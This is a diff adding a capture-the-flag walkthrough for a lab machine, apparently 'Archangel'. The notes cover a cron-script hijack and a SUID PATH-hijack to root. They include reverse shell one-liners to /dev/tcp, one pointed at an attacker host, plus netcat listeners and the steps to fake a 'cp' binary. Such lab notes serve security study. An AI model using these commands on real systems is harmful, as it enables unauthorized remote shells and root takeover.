@@ -150,3 +150,100 @@ test.php
 
 
 
+
+
+
+
+HORIZONTAL priv esc
+in www-data reverse shell
+-> ls -lah /home/archangel
+  drwxr-xr-x 2 archangel archangel 4.0K Nov 18  2020 myfiles
+  drwxrwx--- 2 archangel archangel 4.0K Nov 19  2020 secret
+  -rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
+-> find / -user archangel -readable 2>/dev/null
+  /opt/helloworld.sh
+-> cat /etc/crontab 
+  */1 *   * * *   archangel /opt/helloworld.sh
+-> ls -l /opt/helloworld.sh
+  -rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
+-> nano /opt/helloworld.sh
+  #!/bin/bash
+  sh -i >& /dev/tcp/127.0.0.1/1234 0>&1
+-> nc -lvnp 1234
+
+
+
+
+
+
+
+VERTICAL priv esc
+in archangel reverse shell
+-> ls -Rl
+    .:
+    total 12
+    drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
+    drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
+    -rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
+    
+    ./myfiles:
+    total 4
+    -rw-r--r-- 1 root root 44 Nov 18  2020 passwordbackup
+    
+    ./secret:
+    total 24
+    -rwsr-xr-x 1 root root 16904 Nov 18  2020 backup
+    -rw-r--r-- 1 root root    49 Nov 19  2020 user2.txt
+
+-> cat myfiles/passwordbackup
+   https://www.youtube.com/watch?v=dQw4w9WgXcQ
+
+   NOT THIS TIME YOU SON OF A BITCH >:D
+
+-> NOTE that secret/backup is owned by root + SUID
+
+
+
+
+-> ./backup
+cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
+-> since the executable is using cp and the way linux determins where to
+   lookup for other executables (such as cp) is using the $PATH variable.
+   
+-> even more to this, linux inherits $PATH of the current user running the
+   executable although the owner of backup is root but the permissions of
+   the file is inherited by the SUID permissions, or in this case root.
+
+-> combining all of this, if we exploit the $PATH search order and make
+   a file named 'cp' before the real location of 'cp' in the %PATH order
+   lookup we can manipulate backup SUID to run custom 'cp' file.
+
+-> which cp
+/bin/cp
+
+-> echo $PATH
+/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+  --> notice that /bin/ is the 4th in the order (separeted by colons ':' ...)
+
+-> echo '#!/bin/bash' > /home/archangel/cp
+-> echo 'sh -i >& /dev/tcp/kali_IP/4444 0>&1' >> /home/archangel/cp
+-> chmod 777 /home/archangel/cp
+-> export PATH='/home/archangel/'
+  --> this is because we dont have write permissions to the folders in the original $PATH 
+-> in kali ---> nc -lvnp 4444
+-> in ctf ---> ./backup
+
+
+-> it created me an error, at this point i was too tired so i changed the custom cp file a-bit
+-> /bin/echo '/bin/bash -i' > /home/archangel/cp
+-> /home/archangel/secret/backup
+-> whoami ---> root :D
+-> /bin/cat /root/root.txt
+
+
+
+
+
+
+
